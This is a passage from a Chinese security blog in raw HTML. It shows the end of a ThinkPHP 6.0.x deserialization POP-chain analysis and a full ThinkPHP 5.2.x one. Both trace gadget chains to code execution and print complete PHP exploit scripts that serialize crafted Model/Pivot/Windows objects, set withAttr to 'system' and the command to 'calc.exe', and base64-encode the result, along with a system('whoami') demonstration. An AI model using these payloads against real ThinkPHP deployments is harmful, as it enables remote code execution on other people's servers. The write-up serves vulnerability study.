class="keyword">$this</span>-&gt;db();</span><br><span class="line">            $table = <span class="keyword">$this</span>-&gt;table ? <span class="keyword">$this</span>-&gt;table . <span class="keyword">$this</span>-&gt;suffix : $query-&gt;getTable();</span><br></pre></td></tr></table></figure>

<p>通过设置$this-&gt;field为空，$this-&gt;schema为空进入__toString触发点db()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">db</span><span class="params">($scope = [])</span>: <span class="title">Query</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** <span class="doctag">@var</span> Query $query */</span></span><br><span class="line">    $query = <span class="keyword">self</span>::$db-&gt;connect(<span class="keyword">$this</span>-&gt;connection)</span><br><span class="line">        -&gt;name(<span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;suffix)</span><br><span class="line">        -&gt;pk(<span class="keyword">$this</span>-&gt;pk);</span><br></pre></td></tr></table></figure>

<p>在这里可以很明显的看到有字符串拼接，将这两个变量随便一个设置为我们想要触发的类就可以触发后面的链了，后面的链在上一篇文章也分析过，这里就不详细分析了。</p>
<p>调用栈如下</p>
<p><img src="https://s2.ax1x.com/2019/10/09/u5h9sI.png" alt="u5h9sI.png"></p>
<p>这个poc感觉也是很值得参考学习</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- Created by PhpStorm.</span></span><br><span class="line"><span class="comment">- User: wh1t3P1g</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span> &#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">Conversion</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">visible</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> RelationShip&#123;</span><br><span class="line">        <span class="keyword">private</span> $relation;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> Attribute&#123;</span><br><span class="line">        <span class="keyword">private</span> $withAttr;</span><br><span class="line">        <span class="keyword">private</span> $data;</span><br><span class="line">        <span class="keyword">protected</span> $type;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> ModelEvent&#123;</span><br><span class="line">        <span class="keyword">protected</span> $withEvent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">private</span> $lazySave;</span><br><span class="line">    <span class="keyword">private</span> $exists;</span><br><span class="line">    <span class="keyword">private</span> $force;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $suffix;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($obj == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"calc.exe"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;relation = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;[]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;visible= <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;[]);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withAttr = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"system"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;lazySave = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;withEvent = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exists = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;force = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data = <span class="keyword">array</span>(<span class="string">"wh1t3p1g"</span>=&gt;<span class="string">"calc.exe"</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="string">"mysql"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;suffix = $obj;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Pivot</span> <span class="title">extends</span> \<span class="title">think</span>\<span class="title">Model</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">obj</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title">parent</span>::<span class="title">__construct</span>($<span class="title">obj</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">pivot1</span> = <span class="title">new</span> \<span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>(<span class="title">null</span>);</span><br><span class="line">    $pivot2 = <span class="keyword">new</span> \think\model\Pivot($pivot1);</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize($pivot2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.anquanke.com/post/id/187819#h2-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187819#h2-6</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" data-id="ckabsu38r002fkkvrayr0f28g" class="article-share-link" data-share="baidu" data-title="Thinkphp 6.0.x pop链分析">Share</a>
      

      
        <a href="http://yoursite.com/2019/10/09/Thinkphp-6-0-x-pop%E9%93%BE%E5%88%86%E6%9E%90/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Thinkphp-5-2-x-pop链分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2019-10-08T12:34:35.000Z" itemprop="datePublished">2019-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/08/Thinkphp-5-2-x-pop%E9%93%BE%E5%88%86%E6%9E%90/">Thinkphp 5.2.x pop链分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>紧接着第一篇5.1.x的pop链分析，接下来分析第二篇5.2.x的pop链</p>
<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p><img src="https://s2.ax1x.com/2019/10/08/ufH5Se.png" alt="ufH5Se.png"></p>
<h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p>Thinkphp5.2和Thinkphp5.1的区别是：</p>
<p>在tp5.1中我们可以触发Request类中的__call方法进而触发call_user_func_array调用input方法，进而调用filtervalue，配合自己设置的$this-&gt;filter进行call_user_func 实现 RCE.</p>
<p>那么在Thinkphp5.2中Request类是被删除掉了，所以后面的链是不可用的，不过前面到file_exits触发__toString还是可以用的，那么前面的就file_exists之前就不再详细分析了，主要分析下触发__toString后的调用流程</p>
<p>在thinkphp5.1中是通过visiable函数去触发__call,那么Request类中的__call被删了，自然这个触发点也就没作用了，所以接下来寻找新的触发点</p>
<p><strong>同样在toArray()函数中</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        $item[$key] = $val-&gt;toArray();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>触发点在getAttr()函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">            $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>

<p><strong>跟进getAttr()函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>跟进getValue()函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span><span class="params">(string $name, $value, bool $relation = false)</span></span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">(isset<span class="params">($this-&gt;withAttr[$fieldName])</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> ($relation) &#123;</span><br><span class="line">                $value = <span class="keyword">$this</span>-&gt;getRelationValue($name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">       $closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br><span class="line">       $value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><strong>漏洞触发点如下</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value   = $closure($value, <span class="keyword">$this</span>-&gt;data);</span><br></pre></td></tr></table></figure>

<p>回推$value，$closure，$this-&gt;data</p>
<p><strong>先看一下$value</strong></p>
<p>我们这里并没有设置$relation，所以这里$value的值是从参数传进来的，回推到getAttr函数，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $relation = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        $relation = <span class="keyword">true</span>;</span><br><span class="line">        $value    = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到$value= $this-&gt;getData($name),跟进getData函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>为了更清晰的解释，我们可以先看看这个$name传进来的到底是什么，关键代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge(<span class="keyword">$this</span>-&gt;data, <span class="keyword">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($val <span class="keyword">instanceof</span> Model || $val <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">            $val-&gt;visible(<span class="keyword">$this</span>-&gt;visible[$key]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key])) &#123;</span><br><span class="line">            $val-&gt;hidden(<span class="keyword">$this</span>-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关联模型对象</span></span><br><span class="line">        $item[$key] = $val-&gt;toArray();</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;visible[$key])) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">        $item[$key] = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们这里先通过了arrar_merge函数将$this-&gt;data与$this-&gt;relation，但是$this-&gt;relation没赋值的情况下，$data就是$this-&gt;data,所以可以看出传入getAttr函数中的参数是data数组中的键值</p>
<p>接着getData</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(string $name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    $fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($fieldName, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>$name非空，进入getRealFieldName函数，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRealFieldName</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;strict ? $name : App::parseName($name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去看一下$this-&gt;strict的值，在Attribute.php中第86行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $strict = <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>

<p>那么就意味着$fieldName也是我们$name数组的key,紧接着</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$fieldName];</span><br></pre></td></tr></table></figure>

<p>这样就返回了我们$name数组键对应的值,也就是$value。</p>
<p>在getAttr函数中我们可以看到通过getData返回的值作为$value传给了getValue函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">(string $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ...</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getValue($name, $value, $relation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们就确定了漏洞触发点$value   = $closure($value, $this-&gt;data);中$value的值。</p>
<p>接着去看一下$closure的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$closure = <span class="keyword">$this</span>-&gt;withAttr[$fieldName];</span><br></pre></td></tr></table></figure>

<p>我们可以自己控制withAttr这个数组，那么接着去看一下$fieldName的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fieldName = <span class="keyword">$this</span>-&gt;getRealFieldName($name);</span><br></pre></td></tr></table></figure>

<p>和之前的一样，$name的值也是我们自己控制的，是data数组的键值，那么$closure的值也找到了，就是withAttr数组中的值</p>
<p>再看一下$this-&gt;data,我们可以自己设置</p>
<p>最终形式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span><span class="params">(param,array<span class="params">()</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>利用方式如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>();</span><br><span class="line">system(<span class="string">'whoami'</span>,$a);</span><br></pre></td></tr></table></figure>

<p>回显结果</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># php test.php</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>那么exp就比较好写了，魔改了一下tp5.1的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $files;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;files = [<span class="keyword">new</span> Pivot()];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $data=<span class="keyword">array</span>(<span class="string">"pwn"</span> =&gt; <span class="string">"calc.exe"</span>);</span><br><span class="line">        <span class="keyword">private</span> $withAttr = <span class="keyword">array</span>(<span class="string">"pwn"</span> =&gt; <span class="string">"system"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line">$Conver = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($Conver));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用栈</p>
<p><img src="https://s2.ax1x.com/2019/10/08/uhQgxK.png" alt="uhQgxK.png"></p>
<p><img src="https://s2.ax1x.com/2019/10/08/uh3ibF.png" alt="uh3ibF.png"></p>
<h3 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h3><p><a href="https://www.anquanke.com/post/id/187819" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187819</a></p>

      
    </div>
    <footer class="article-footer">
      
